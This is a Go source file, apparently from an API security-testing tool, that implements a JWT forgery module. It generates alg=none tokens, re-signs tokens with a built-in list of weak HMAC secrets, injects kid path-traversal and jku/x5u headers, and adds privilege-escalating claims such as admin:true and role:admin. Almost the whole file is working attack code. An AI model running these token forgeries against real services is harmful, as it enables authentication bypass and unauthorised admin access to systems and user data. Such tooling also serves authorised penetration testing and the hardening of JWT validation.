package auth

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"sync"

	"github.com/assetnote/kiterunner2/pkg/log"
)

// JWTToken represents a parsed JWT token
type JWTToken struct {
	Raw       string
	Header    map[string]interface{}
	Payload   map[string]interface{}
	Signature string
}

// JWTBruteConfig holds configuration for JWT brute force attacks
type JWTBruteConfig struct {
	// EnableNoneAlg enables the "alg=none" attack
	EnableNoneAlg bool
	// EnableWeakHMAC enables weak HMAC key attacks
	EnableWeakHMAC bool
	// CommonSecrets is a list of common secrets to try for HMAC signing
	CommonSecrets []string
	// CustomSecrets is a list of custom secrets to try for HMAC signing
	CustomSecrets []string
	// EnableKeyConfusion enables key confusion attacks
	EnableKeyConfusion bool
	// EnableHeaderInjection enables header injection attacks
	EnableHeaderInjection bool
	// EnablePayloadInjection enables payload injection attacks
	EnablePayloadInjection bool
	// PayloadInjections contains payload modifications to try
	PayloadInjections []map[string]interface{}
}

// DefaultJWTBruteConfig returns a default JWT brute force configuration
func DefaultJWTBruteConfig() *JWTBruteConfig {
	return &JWTBruteConfig{
		EnableNoneAlg:          true,
		EnableWeakHMAC:         true,
		EnableKeyConfusion:     true,
		EnableHeaderInjection:  true,
		EnablePayloadInjection: true,
		CommonSecrets: []string{
			"secret", "key", "private", "SECRET", "KEY", "PRIVATE",
			"password", "PASSWORD", "pass", "PASS", "jwt", "JWT",
			"", "1234", "12345", "123456", "admin", "test", "dev",
			"secret123", "password123", "key123", "jwt_secret", "jwt_key",
			"api_secret", "api_key", "app_secret", "app_key",
		},
		PayloadInjections: []map[string]interface{}{
			{"admin": true},
			{"isAdmin": true},
			{"role": "admin"},
			{"permissions": "admin"},
			{"group": "admin"},
			{"privilege": "admin"},
			{"access": "full"},
			{"exp": 9999999999}, // Far future expiration
		},
	}
}

// JWTBruter performs JWT brute force attacks
type JWTBruter struct {
	Config *JWTBruteConfig
	mutex  sync.RWMutex
}

// NewJWTBruter creates a new JWT brute forcer
func NewJWTBruter(config *JWTBruteConfig) *JWTBruter {
	if config == nil {
		config = DefaultJWTBruteConfig()
	}
	return &JWTBruter{
		Config: config,
	}
}

// ParseJWT parses a JWT token into its components
func (j *JWTBruter) ParseJWT(token string) (*JWTToken, error) {
	// Remove "Bearer " prefix if present
	token = strings.TrimPrefix(token, "Bearer ")

	// Split the token into parts
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("invalid JWT format: expected 3 parts, got %d", len(parts))
	}

	// Decode header
	headerJSON, err := base64URLDecode(parts[0])
	if err != nil {
		return nil, fmt.Errorf("failed to decode header: %v", err)
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerJSON, &header); err != nil {
		return nil, fmt.Errorf("failed to parse header JSON: %v", err)
	}

	// Decode payload
	payloadJSON, err := base64URLDecode(parts[1])
	if err != nil {
		return nil, fmt.Errorf("failed to decode payload: %v", err)
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadJSON, &payload); err != nil {
		return nil, fmt.Errorf("failed to parse payload JSON: %v", err)
	}

	return &JWTToken{
		Raw:       token,
		Header:    header,
		Payload:   payload,
		Signature: parts[2],
	}, nil
}

// GenerateTokenVariants generates variants of a JWT token for testing
func (j *JWTBruter) GenerateTokenVariants(token string) []string {
	j.mutex.RLock()
	defer j.mutex.RUnlock()

	var variants []string

	parsedToken, err := j.ParseJWT(token)
	if err != nil {
		log.Error().Err(err).Str("token", token).Msg("Failed to parse JWT token")
		return variants
	}

	// Add the original token as a reference
	variants = append(variants, token)

	// Generate "alg=none" attack variants
	if j.Config.EnableNoneAlg {
		noneVariants := j.generateNoneAlgVariants(parsedToken)
		variants = append(variants, noneVariants...)
	}

	// Generate weak HMAC key variants
	if j.Config.EnableWeakHMAC {
		hmacVariants := j.generateWeakHMACVariants(parsedToken)
		variants = append(variants, hmacVariants...)
	}

	// Generate header injection variants
	if j.Config.EnableHeaderInjection {
		headerVariants := j.generateHeaderInjectionVariants(parsedToken)
		variants = append(variants, headerVariants...)
	}

	// Generate payload injection variants
	if j.Config.EnablePayloadInjection {
		payloadVariants := j.generatePayloadInjectionVariants(parsedToken)
		variants = append(variants, payloadVariants...)
	}

	return variants
}

// generateNoneAlgVariants generates JWT tokens with "alg=none" attack
func (j *JWTBruter) generateNoneAlgVariants(token *JWTToken) []string {
	var variants []string

	// Create a copy of the header and set alg to none
	for _, algValue := range []string{"none", "None", "NONE", "nOnE"} {
		header := make(map[string]interface{})
		for k, v := range token.Header {
			header[k] = v
		}
		header["alg"] = algValue

		// Encode the modified header
		headerJSON, err := json.Marshal(header)
		if err != nil {
			continue
		}

		headerEncoded := base64URLEncode(headerJSON)
		payloadEncoded := strings.Split(token.Raw, ".")[1]

		// Create variants with different signature handling
		variants = append(variants,
			fmt.Sprintf("%s.%s.", headerEncoded, payloadEncoded),           // Empty signature
			fmt.Sprintf("%s.%s.%s", headerEncoded, payloadEncoded, ""),     // Empty signature (explicit)
			fmt.Sprintf("%s.%s.%s", headerEncoded, payloadEncoded, "null"), // "null" signature
		)
	}

	return variants
}

// generateWeakHMACVariants generates JWT tokens with weak HMAC keys
func (j *JWTBruter) generateWeakHMACVariants(token *JWTToken) []string {
	var variants []string

	// Ensure the algorithm is set to HS256
	header := make(map[string]interface{})
	for k, v := range token.Header {
		header[k] = v
	}
	header["alg"] = "HS256"

	// Encode the header and payload
	headerJSON, err := json.Marshal(header)
	if err != nil {
		return variants
	}

	headerEncoded := base64URLEncode(headerJSON)
	payloadEncoded := strings.Split(token.Raw, ".")[1]

	// The message to sign is header.payload
	message := headerEncoded + "." + payloadEncoded

	// Try common secrets
	allSecrets := append(j.Config.CommonSecrets, j.Config.CustomSecrets...)
	for _, secret := range allSecrets {
		// Sign the message with HMAC-SHA256
		signature := computeHMACSHA256(message, secret)

		// Create the token
		variant := fmt.Sprintf("%s.%s.%s", headerEncoded, payloadEncoded, signature)
		variants = append(variants, variant)
	}

	return variants
}

// generateHeaderInjectionVariants generates JWT tokens with header injections
func (j *JWTBruter) generateHeaderInjectionVariants(token *JWTToken) []string {
	var variants []string

	// Header injection payloads
	headerInjections := []map[string]interface{}{
		{"kid": "../../../../../../dev/null"},
		{"kid": "none"},
		{"kid": "/dev/null"},
		{"x5u": "http://localhost"},
		{"jku": "http://localhost"},
	}

	for _, injection := range headerInjections {
		// Create a copy of the header and add the injection
		header := make(map[string]interface{})
		for k, v := range token.Header {
			header[k] = v
		}

		// Apply the injection
		for k, v := range injection {
			header[k] = v
		}

		// Encode the modified header
		headerJSON, err := json.Marshal(header)
		if err != nil {
			continue
		}

		headerEncoded := base64URLEncode(headerJSON)
		payloadEncoded := strings.Split(token.Raw, ".")[1]

		// Create a variant with the original signature
		variant := fmt.Sprintf("%s.%s.%s", headerEncoded, payloadEncoded, token.Signature)
		variants = append(variants, variant)
	}

	return variants
}

// generatePayloadInjectionVariants generates JWT tokens with payload injections
func (j *JWTBruter) generatePayloadInjectionVariants(token *JWTToken) []string {
	var variants []string

	for _, injection := range j.Config.PayloadInjections {
		// Create a copy of the payload and add the injection
		payload := make(map[string]interface{})
		for k, v := range token.Payload {
			payload[k] = v
		}

		// Apply the injection
		for k, v := range injection {
			payload[k] = v
		}

		// Encode the modified payload
		payloadJSON, err := json.Marshal(payload)
		if err != nil {
			continue
		}

		headerEncoded := strings.Split(token.Raw, ".")[0]
		payloadEncoded := base64URLEncode(payloadJSON)

		// Create a variant with the original signature
		variant := fmt.Sprintf("%s.%s.%s", headerEncoded, payloadEncoded, token.Signature)
		variants = append(variants, variant)

		// If weak HMAC is enabled, also try signing with common secrets
		if j.Config.EnableWeakHMAC {
			message := headerEncoded + "." + payloadEncoded

			// Try common secrets
			allSecrets := append(j.Config.CommonSecrets, j.Config.CustomSecrets...)
			for _, secret := range allSecrets {
				// Sign the message with HMAC-SHA256
				signature := computeHMACSHA256(message, secret)

				// Create the token
				signedVariant := fmt.Sprintf("%s.%s.%s", headerEncoded, payloadEncoded, signature)
				variants = append(variants, signedVariant)
			}
		}
	}

	return variants
}

// Helper functions

// base64URLDecode decodes a base64url encoded string
func base64URLDecode(s string) ([]byte, error) {
	// Add padding if needed
	if len(s)%4 != 0 {
		s += strings.Repeat("=", 4-len(s)%4)
	}

	// Replace URL encoding specific characters
	s = strings.ReplaceAll(s, "-", "+")
	s = strings.ReplaceAll(s, "_", "/")

	return base64.StdEncoding.DecodeString(s)
}

// base64URLEncode encodes data to base64url
func base64URLEncode(data []byte) string {
	s := base64.StdEncoding.EncodeToString(data)

	// Replace standard base64 characters with URL-safe ones
	s = strings.ReplaceAll(s, "+", "-")
	s = strings.ReplaceAll(s, "/", "_")

	// Remove padding
	s = strings.TrimRight(s, "=")

	return s
}

// computeHMACSHA256 computes HMAC-SHA256 signature
func computeHMACSHA256(message, secret string) string {
	h := hmac.New(sha256.New, []byte(secret))
	h.Write([]byte(message))
	signature := h.Sum(nil)
	return base64URLEncode(signature)
}

// ExtractJWTFromHeader extracts a JWT token from an Authorization header
func ExtractJWTFromHeader(authHeader string) string {
	if strings.HasPrefix(authHeader, "Bearer ") {
		return strings.TrimPrefix(authHeader, "Bearer ")
	}
	return authHeader
}
